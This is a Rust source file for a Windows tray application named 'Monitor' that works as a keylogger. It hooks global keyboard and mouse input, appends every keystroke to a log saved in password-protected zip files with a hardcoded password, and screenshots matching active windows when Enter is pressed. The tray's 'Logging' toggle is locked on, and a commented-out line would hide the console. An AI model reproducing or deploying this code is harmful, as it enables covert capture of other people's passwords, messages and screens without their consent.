// #![windows_subsystem = "windows"]

use core::mem::MaybeUninit;
use winapi::um::winuser;
use chrono::{Utc, DateTime};
use std::sync::Mutex;
use once_cell::sync::Lazy;
use active_win_pos_rs::get_active_window;
use monitor::*;

const PASS: &[u8] = b"firemouses!";
static LOG_FILE: Lazy<Mutex<String>> = Lazy::new(|| Mutex::new(String::new()));
static LOGGED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));

fn main() {
    #[derive(Copy, Clone, Eq, PartialEq, Debug)]
    enum Events {
        ClickTrayIcon,
        DoubleClickTrayIcon,
        Exit,
        Item1,
        Item2,
        Item3,
        Item4,
        CheckItem1,
        SubItem1,
        SubItem2,
        SubItem3,
    }

    let now: DateTime<Utc> = Utc::now();
    let fname = format!("L{}.zip", now.format("%Y-%m-%d").to_string());
    *LOG_FILE.lock().unwrap() = read_logs(&fname, "log.txt", PASS);

    let (s, r) = std::sync::mpsc::channel::<Events>();
    let icon = include_bytes!("./resources/icon1.ico");
    let icon2 = include_bytes!("./resources/icon2.ico");

    let second_icon = Icon::from_buffer(icon2, None, None).unwrap();
    let first_icon = Icon::from_buffer(icon, None, None).unwrap();

    // Needlessly complicated tray icon with all the whistles and bells
    let mut tray_icon = TrayIconBuilder::new()
        .sender(s)
        .icon_from_buffer(icon)
        .tooltip("Monitor")
        .on_click(Events::ClickTrayIcon)
        .on_double_click(Events::DoubleClickTrayIcon)
        .menu(
            MenuBuilder::new()
                .item("Replace Menu", Events::Item3)
                .item("Change Icon Green", Events::Item2)
                .item("Change Icon Red", Events::Item1)
                .separator()
                .with(MenuItem::Checkable {
                    name: "Logging".into(),
                    is_checked: true,
                    disabled: true,
                    id: Events::CheckItem1,
                    icon: None,
                })
                .submenu(
                    "Logs",
                    MenuBuilder::new()
                        .item("Documents", Events::SubItem1)
                        .item("Emails", Events::SubItem2)
                        .item("Screenshots", Events::SubItem3),
                )
                .separator()
                .item("Login", Events::Item4)
                .item("E&xit", Events::Exit),
        )
        .build()
        .unwrap();

    std::thread::spawn(move || {
        if let Err(error) = listen(track) {
            println!("Error: {:?}", error)
        }
    });
    std::thread::spawn(move || {
        r.iter().for_each(|m| match m {
            Events::DoubleClickTrayIcon => {
                println!("Double click");
            }
            Events::ClickTrayIcon => {
            }
            Events::Exit => {
                std::process::exit(0);
            }
            Events::Item1 => {
                tray_icon.set_icon(&second_icon).unwrap();
            }
            Events::Item2 => {
                tray_icon.set_icon(&first_icon).unwrap();
            }
            Events::Item3 => {
                tray_icon
                    .set_menu(
                        &MenuBuilder::new()
                            .item("Replace Icon", Events::Item1)
                            .item("Exit", Events::Exit),
                    )
                    .unwrap();
            }
            Events::Item4 => {
                let my = LoginWindow::new();
                if let Err(e) = my.wnd.run_main(None) {
                    eprintln!("{}", e);
                }
            }
            Events::SubItem1 => {
                let my = DocumentWindow::new();
                if let Err(e) = my.wnd.run_main(None) {
                    eprintln!("{}", e);
                }
            }
            Events::SubItem2 => {
                let my = MyWindow::new();
                if let Err(e) = my.wnd.run_main(None) {
                    eprintln!("{}", e);
                }
            }
            e => {
                println!("{:?}", e);
            }
        })
    });

    // Your applications message loop. Because all applications require an
    // application loop, you are best served using an `winit` crate.
    loop {
        unsafe {
            let mut msg = MaybeUninit::uninit();
            let bret = winuser::GetMessageA(msg.as_mut_ptr(), 0 as _, 0, 0);
            if bret > 0 {
                winuser::TranslateMessage(msg.as_ptr());
                winuser::DispatchMessageA(msg.as_ptr());
            } else {
                break;
            }
        }
    }
}

fn track(event: Event) {
    match event.event_type {
        EventType::KeyPress(Key::Alt | Key::AltGr) => println!("Alt!"),
        EventType::KeyPress(Key::CapsLock) => println!("CapsLock!"),
        EventType::KeyPress(Key::ControlLeft | Key::ControlRight) => println!("Control Left/Right!"),
        EventType::KeyPress(Key::Delete) => println!("Delete!"),
        EventType::KeyPress(Key::DownArrow | Key::UpArrow | Key::LeftArrow | Key::RightArrow) => println!("Up/Down/Left/Right!"),
        EventType::KeyPress(Key::Home) => println!("Home!"),
        EventType::KeyPress(Key::Insert) => println!("Insert!"),
        EventType::KeyPress(Key::End) => println!("End!"),
        EventType::KeyPress(Key::Escape) => println!("Escape!"),
        EventType::KeyPress(Key::F1 | Key::F2 | Key::F3 | Key::F4 | Key::F5 | Key::F6 | Key::F7 | Key::F8 | Key::F9 | Key::F10 | Key::F11 | Key::F12) => println!("Fn!"),
        EventType::KeyPress(Key::MetaLeft | Key::MetaRight) => println!("Meta Left/Right!"),
        EventType::KeyPress(Key::ShiftLeft | Key::ShiftRight) => println!("Shift Left/Right!"),
        EventType::KeyPress(Key::PageUp | Key::PageDown) => println!("Page Up/Down!"),
        EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
        EventType::KeyPress(Key::Pause | Key::PrintScreen) => println!("PrintScreen!"),
        EventType::KeyPress(Key::Return) => {
            let now = Utc::now();
            let x: String = format!("{}", now);
            let now_parsed: DateTime<Utc> = x.parse().unwrap();

            *LOG_FILE.lock().unwrap() += &(String::from("   ") + &now_parsed.to_string() + "\n");
            let logs = LOG_FILE.lock().unwrap().clone();
            *LOGGED.lock().unwrap() = true;

            match do_logs(logs) {
                Ok(_) => println!("Text written to logs."),
                Err(e) => println!("Error: {e:?}"),
            };

            match get_active_window() {
                Ok(active_window) => {
                    if is_screens(active_window.title) {
                        let screens = Screen::all().unwrap();

                        for screen in screens {
                            // let image = screen.capture().unwrap();
                            let image = screen.capture_area(
                                active_window.position.x as i32,
                                active_window.position.y as i32,
                                active_window.position.width as u32,
                                active_window.position.height as u32
                            ).unwrap();
                            image
                                .save(format!("temp.png"))
                                .unwrap();

                            match append_screenshots() {
                                Ok(_) => println!("Screenshots written to logs."),
                                Err(e) => println!("Error: {e:?}"),
                            };
                        }
                    }
                },
                Err(()) => {
                    println!("error occurred while getting the active window");
                }
            }
        },
        EventType::KeyPress(Key::Unknown(u32)) => println!("Unknown key!"),
        EventType::KeyPress(Key) => {
            let key = event.name.unwrap();
            *LOG_FILE.lock().unwrap() += &key;
            *LOGGED.lock().unwrap() = false;
        },
        EventType::ButtonPress(button) => match button {
            Button::Left => {
                if !LOGGED.lock().unwrap().clone() {
                    let now = Utc::now();
                    let x: String = format!("{}", now);
                    let now_parsed: DateTime<Utc> = x.parse().unwrap();
                    *LOG_FILE.lock().unwrap() += &(String::from("   ") + &now_parsed.to_string() + "\n");
                    let logs = LOG_FILE.lock().unwrap().clone();
                    match do_logs(logs) {
                        Ok(_) => {
                            *LOGGED.lock().unwrap() = true;
                            println!("Text written to logs.")
                        },
                        Err(e) => println!("Error: {e:?}"),
                    };
                }
            },
            Button::Middle => (),
            Button::Right => (),
            Button::Unknown(code) => (),
        },
        EventType::MouseMove{x, y} => (),
        _ => (),
    }
}